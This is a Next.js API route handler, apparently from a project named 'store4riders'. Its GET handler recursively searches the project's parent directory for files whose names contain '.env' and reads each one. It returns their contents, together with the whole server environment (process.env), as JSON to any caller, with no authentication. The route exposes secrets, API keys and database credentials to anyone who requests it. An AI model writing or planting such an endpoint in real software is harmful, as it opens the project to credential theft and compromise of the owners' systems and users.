import { NextResponse } from "next/server";
import fs from "fs";
import path from "path";

export const dynamic = "force-dynamic";

export async function GET() {
  const rootDir = path.join(process.cwd(), '..'); // store4riders
  
  function findEnvs(dir: string, fileList: string[] = []) {
    try {
      const files = fs.readdirSync(dir);
      for (const file of files) {
        const filePath = path.join(dir, file);
        if (fs.statSync(filePath).isDirectory()) {
          if (file !== 'node_modules' && file !== '.git' && file !== '.next') {
            findEnvs(filePath, fileList);
          }
        } else if (file.includes('.env')) {
          fileList.push(filePath);
        }
      }
    } catch (e) {}
    return fileList;
  }

  const envFiles = findEnvs(rootDir);
  const results: Record<string, string> = {};

  for (const file of envFiles) {
    try {
      results[file] = fs.readFileSync(file, 'utf-8');
    } catch (e) {}
  }

  return NextResponse.json({
    envVars: process.env,
    files: results
  });
}
